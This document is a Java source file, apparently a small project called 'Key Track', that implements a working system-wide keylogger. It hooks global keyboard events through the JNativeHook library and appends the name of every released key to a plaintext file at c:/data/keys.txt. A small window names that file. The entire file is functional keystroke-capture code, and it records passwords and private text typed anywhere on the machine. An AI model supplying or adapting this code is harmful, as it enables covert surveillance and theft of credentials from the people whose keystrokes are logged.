/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */

import java.io.BufferedWriter;
import java.io.File;
import java.io.FileWriter;
import java.io.IOException;
import java.util.logging.Handler;
import java.util.logging.Level;
import java.util.logging.LogManager;
import java.util.logging.Logger;
import javax.swing.JFrame;
import javax.swing.JLabel;
import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;
import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;

/**
 *
 * @author Thilak
 */
public class Tk implements NativeKeyListener {

    public static void main(String args[]) {
        JFrame jf = new JFrame();
        GlobalScreen gs = GlobalScreen.getInstance();
        try {
            GlobalScreen.registerNativeHook();
//            gs.registerNativeHook();
        } catch (NativeHookException ex) {
            System.err.println("There was a problem registering the native hook.");
            System.err.println(ex.getMessage());

            System.exit(1);
        }
        gs.addNativeKeyListener(new Tk());

        JLabel jl = new JLabel("Check keystroke at C:/data/keys.txt");
        jl.setBounds(50, 50, 300, 50);
        jf.add(jl);
        jf.setTitle("Key Track");
        jf.setSize(300, 200);//400 width and 500 height  
        jf.setLayout(null);//using no layout managers  
        jf.setVisible(true);//making the frame visible
    }

    @Override
    public void nativeKeyPressed(NativeKeyEvent nke) {
        Logger log = LogManager.getLogManager().getLogger("");
        for (Handler h : log.getHandlers()) {
            h.setLevel(Level.ALL);
        }

//        System.out.println("Key Pressed: " + NativeKeyEvent.getKeyText(nke.getKeyCode()));

    }

    @Override
    public void nativeKeyReleased(NativeKeyEvent nke) {
//        throw new UnsupportedOperationException("Not supported yet."); //To change body of generated methods, choose Tools | Templates.
        System.out.println("Key Pressed: " + NativeKeyEvent.getKeyText(nke.getKeyCode()));
        String keyData = NativeKeyEvent.getKeyText(nke.getKeyCode());
        File file = new File("c:/data/keys.txt");
        try {
            if (file.createNewFile()) {
                BufferedWriter br = new BufferedWriter(new FileWriter(file, true));
                br.newLine();
                br.write("Action: "+keyData + "\n");
                br.close();
            } else {
                BufferedWriter br = new BufferedWriter(new FileWriter(file, true));
                br.newLine();
                br.write("Action: "+keyData + "\n");
                br.close();
            }
        } catch (IOException ex) {
            Logger.getLogger(Tk.class.getName()).log(Level.SEVERE, null, ex);
        }
    }

    @Override
    public void nativeKeyTyped(NativeKeyEvent nke) {
//        System.out.println("Key Presseds: " + NativeKeyEvent.getKeyText(nke.getKeyLocation()));
    }
}
